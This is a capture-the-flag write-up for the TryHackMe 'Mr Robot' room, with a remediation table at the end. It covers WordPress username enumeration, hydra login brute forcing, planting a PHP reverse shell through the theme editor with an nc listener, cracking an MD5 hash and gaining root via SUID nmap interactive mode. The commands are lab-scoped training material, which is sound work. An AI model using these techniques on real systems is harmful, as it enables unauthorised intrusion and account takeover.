# TryHackMe — Mr Robot CTF

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **OS** | Linux (Ubuntu) |
| **Date** | 2026-11-28 |
| **Skills** | robots.txt disclosure, WordPress username enumeration, wordlist deduplication, hydra `http-post-form`, WordPress theme editor RCE, MD5 cracking (hashcat), SUID `nmap --interactive` |

> Keys, passwords and hashes are redacted, following TryHackMe's write-up guidelines.

## Summary

The room hides **three keys** instead of user and root flags.

1. `robots.txt` exposes the first key and a custom wordlist.
2. The WordPress login form reveals whether a username exists. That gives the user **Elliot**, and the same wordlist, once deduplicated, gives his password.
3. Elliot is a WordPress administrator. The theme editor runs a PHP reverse shell as `daemon`.
4. `/home/robot` holds the second key, only readable by robot, and a raw MD5 hash of robot's password, readable by everyone. hashcat cracks it in under a second.
5. `nmap` is SUID root and old enough to have interactive mode, which spawns a root shell. The third key is in `/root`.

## 1. Reconnaissance

```bash
sudo nmap -p- --min-rate 1000 -T4 -oN ports.txt <TARGET>
nmap -p 22,80,443 -sV -sC -oN serveis.txt <TARGET>
```

The first full scan returned 22, 80 and 443 as `closed` and everything else as `filtered`. `closed` means the host answers with a reset, so the packet arrives but nothing listens. The machine was still booting: the services came up a few minutes later.

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 8.2p1 (Ubuntu) | |
| 80 | Apache httpd | No title |
| 443 | Apache httpd (SSL) | Default `www.example.com` certificate, expired |

**Dead end:** the full port scan ran while the services were still starting, so its result can't be trusted. Any service slower to start could have shown up as `filtered`. It should be repeated once the box is fully up.

## 2. Web enumeration

The home page is an interactive "terminal" in JavaScript. Each command plays a video or shows an image. It runs in the browser, not on the server, and links to the show's real promotional site, which is out of scope.

The HTML comments are template boilerplate (`<!--[if lt IE 9]>`, `Google Plus confirmation`), not hints.

```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt --timeout 30s
```

The first run stopped on its initial check: the server took longer than gobuster's default 10-second timeout. With `--timeout 30s` it worked. Relevant results:

```
admin                (Status: 301)
dashboard            (Status: 302) [--> /wp-admin/]
license              (Status: 200) [Size: 309]
login                (Status: 302) [--> /wp-login.php]
phpmyadmin           (Status: 403)
readme               (Status: 200) [Size: 64]
robots.txt           (Status: 200) [Size: 41]
wp-admin             (Status: 301)
wp-content           (Status: 301)
wp-login             (Status: 200) [Size: 2613]
xmlrpc.php           (Status: 405)
```

It's a **WordPress** site. The RSS feed (`/feed/`) gives the version:

```
<generator>http://wordpress.org/?v=4.3.1</generator>
```

The machine stopped responding halfway through the enumeration (every port `filtered`, VPN up), so I restarted it with a new IP.

### robots.txt

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Each line is a path on the same site:

```bash
curl http://<TARGET>/key-1-of-3.txt     # key 1: <redacted>
wget http://<TARGET>/fsocity.dic
```

**Key 1 found.**

**Dead end:** the `join` command of the fake terminal asks for an email, and I thought about XSS. It leads nowhere here: an XSS runs in a visitor's browser, and in this room there is no other visitor. It's also client-side JavaScript, so the email most likely never reaches the server.

## 3. WordPress — finding the user

The obvious guess for a username was `fsociety`, from the wordlist's name. Before brute forcing with a guessed user, I checked whether it existed: WordPress answers differently depending on what is wrong.

| Input | Message |
|---|---|
| Username that doesn't exist | `Invalid username` |
| Username that exists, wrong password | `The password you entered for the username ... is incorrect` |

`fsociety` returned `Invalid username`. So I used the wordlist as a **list of usernames**, with a fixed password, and told hydra that `Invalid username` means failure.

The form fields, from the intercepted request in Burp:

```
POST /wp-login.php HTTP/1.1
...
log=test&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F<TARGET>%2Fwp-admin%2F&testcookie=1
```

```bash
hydra -L fsocity.dic -p 123456 <TARGET> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F<TARGET>%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```

hydra reported `login: Elliot   password: 123456`. **The password is not real**: hydra only knows that `Invalid username` didn't appear. What it confirms is that **`Elliot` exists**.

## 4. WordPress — finding the password

The same attack, now with a fixed user and the wordlist as passwords. The failure text changes. I used only a stable part of it, because the message includes the username, and WordPress prints it in lowercase (`elliot`) even when you type `Elliot`:

```bash
hydra -l Elliot -P fsocity.dic <TARGET> http-post-form "...:F=is incorrect"
```

```
[STATUS] 2027.00 tries/min, 2027 tries in 00:01h, 856208 to do in 07:03h, 16 active
```

Seven hours. The wordlist is mostly duplicates:

```bash
wc -l fsocity.dic                     # 858160
sort -u fsocity.dic | wc -l           # 11451
sort -u fsocity.dic > fsocity_uniq.dic
```

75 times smaller, with no possible password lost:

```
[STATUS] 2050.00 tries/min, 2050 tries in 00:01h, 9402 to do in 00:05h, 16 active
[80][http-post-form] host: <TARGET>   login: Elliot   password: <redacted>
```

Found in 3 minutes. I confirmed it by logging in.

**Dead end:** I launched the 7-hour run without opening the wordlist first. A custom wordlist should always be checked for size and duplicates before an online attack.

## 5. Foothold — theme editor

Elliot is an **administrator**. The dashboard also lists a subscriber, `mich05654` (Krista Gordon).

Posts and pages are stored in the database and shown as HTML, so PHP inside them never runs. The theme, on the other hand, is made of `.php` files, and an administrator can edit them in **Appearance → Editor**.

I replaced `404.php` with the pentestmonkey PHP reverse shell (`/usr/share/webshells/php/php-reverse-shell.php`), with `$ip` set to my `tun0` address. I chose `404.php` because it only runs when someone requests a page that doesn't exist. I can trigger it on demand, and the rest of the site keeps working. `header.php` or `footer.php` would fire on every visit.

```bash
nc -lvnp 1234
# then visit any page that doesn't exist, or the file directly:
# http://<TARGET>/wp-content/themes/<theme>/404.php
```

```
$ whoami
daemon
```

The machine timer ran out before this step, so I had to restart it and paste the shell again. The credentials stayed the same.

On a real engagement I would add the shell at the top of the file instead, and restore the original file afterwards.

## 6. Lateral movement — daemon → robot

```
$ ls -la /home/robot
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

The key is readable only by robot, but the hash file is readable by everyone (the last `r` in `-rw-r--r--`).

```
robot:<redacted MD5>
```

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```
Status...........: Cracked
Hash.Mode........: 0 (MD5)
```

Cracked in under a second: raw MD5 with no salt and a password inside rockyou. SSH accepted the password, which gave a stable shell instead of the reverse shell:

```bash
ssh robot@<TARGET>
cat key-2-of-3.txt       # key 2: <redacted>
```

**Dead end:** I first read the directory as "only robot can read these" and nearly dropped the lead. The two files had different permissions.

## 7. Privilege escalation — SUID nmap

```
robot@<TARGET>:~$ sudo -l
Sorry, user robot may not run sudo on <TARGET>.
```

```
robot@<TARGET>:~$ find / -perm -4000 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
...
```

Everything is standard except **`/usr/local/bin/nmap`**. GTFOBins → nmap → SUID: versions 2.02 to 5.21 have an interactive mode that runs shell commands with `!`.

```
robot@<TARGET>:~$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root
```

The first attempts failed: a pasted line was left in the buffer, and Backspace sent `^H` characters instead of deleting. Typing `!sh` by hand, on a clean line, worked.

```bash
cat /root/key-3-of-3.txt     # key 3: <redacted>
```

`pkexec` is also SUID, and on an old system that may mean PwnKit (CVE-2021-4034). I didn't test it: nmap was the intended path.

## Attack chain

```
nmap → 80 → robots.txt → key 1 + fsocity.dic
     → wp-login error messages → hydra (wordlist as usernames) → Elliot
     → sort -u (858k → 11k) → hydra → Elliot's password
     → admin → Appearance → Editor → 404.php reverse shell → daemon
     → /home/robot/password.raw-md5 (world-readable) → hashcat → robot over SSH → key 2
     → SUID /usr/local/bin/nmap 3.81 → --interactive → !sh → root → key 3
```

## Root causes and remediation

| Issue | Fix |
|---|---|
| `robots.txt` lists a key and a wordlist | `robots.txt` is public; never use it to hide files. Remove sensitive files from the web root |
| Login reveals whether a username exists | Return one generic error for both cases; WordPress plugins or a custom `login_errors` filter can do it |
| No rate limiting on `wp-login.php` | Lockout after failed attempts, 2FA, or a WAF rule |
| Outdated WordPress 4.3.1 | Keep WordPress core, themes and plugins updated |
| Theme editor enabled for administrators | `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php` |
| Password hash readable by everyone, raw MD5 | Never store password hashes in user files; use a slow salted hash (bcrypt, yescrypt) and correct permissions |
| SSH password authentication | Prefer SSH keys and disable password authentication |
| SUID on `nmap` | Remove the SUID bit (`chmod u-s`); old nmap with interactive mode should not exist on a server |

## Lessons learned

- **Each line in `robots.txt` is a path to open**, not just a hint.
- **Error messages that differ between "bad user" and "bad password" turn a login form into a username oracle.** Check whether a user exists before brute forcing a password.
- **A hydra "success" only means the failure text didn't appear.** If `F=` only catches the bad-user message, a "found" password is just a confirmed username.
- **Use a short, stable part of the error as `F=`**, not the full message with the username in it.
- **Open a custom wordlist before using it.** `wc -l` and `sort -u` took 7 hours down to 3 minutes.
- **Read every permission bit**: files in the same directory can have different permissions.
- **On WordPress, PHP runs in theme and plugin files**, not in posts or pages.
- **Check the machine timer**, and extend it before it runs out.
